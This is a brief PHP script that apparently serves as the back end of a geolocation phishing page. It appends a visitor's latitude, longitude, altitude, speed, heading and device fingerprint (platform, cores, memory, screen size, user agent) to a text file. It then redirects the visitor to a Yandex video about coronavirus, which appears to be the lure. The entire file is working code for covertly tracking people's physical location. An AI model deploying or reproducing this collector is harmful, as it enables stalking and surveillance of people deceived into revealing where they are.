<?php

$timezone=+5;
$t=gmdate("Y/m/j H:i:s", time()+3600*($timezone+date("I")));
file_put_contents("geolocate.txt", "Latitude: " . $_GET['latitude'] . "\n" . "Longitude: " . $_GET["longitude"] . "\n" . "User-Agent: " . $_GET["useragent"] . "\n" . "Altitude: " . $_GET["altitude"] . "\n" . "Accuracy: " . $_GET["accuracy"] . "\n" . "Speed: "  . $_GET["speed"] . "\n" . "Heading: " . $_GET["heading"] . "\n" . "Platform: " . $_GET["platform"] . "\n" . "Cores: " . $_GET["hardware"] . "\n" . "Memory: "   . $_GET["memory"] ."\n" . "Screen Height: "   . $_GET["height"] ."\n" . "Screen Width: "   . $_GET["width"] ."\n"."Time:".$t."\n----------------------", FILE_APPEND);

header('Location: https://yandex.ru/video/preview/?filmId=5878059388136772704&reqid=1597900824212345-60097608038122286800108-vla1-4143&suggest_reqid=272988843158143732808290735172387&text=каронавирус');
exit();
?>
